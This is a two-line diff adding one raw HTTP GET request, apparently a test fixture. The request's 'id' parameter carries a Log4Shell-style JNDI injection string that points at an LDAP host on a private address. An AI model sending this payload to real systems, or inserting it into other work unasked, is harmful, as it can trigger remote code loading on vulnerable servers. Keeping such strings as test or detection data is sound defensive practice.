@@ -1,0 +1,2 @@
+GET /?id=${jndi:ldap://10.240.0.99/a} HTTP/1.1
+
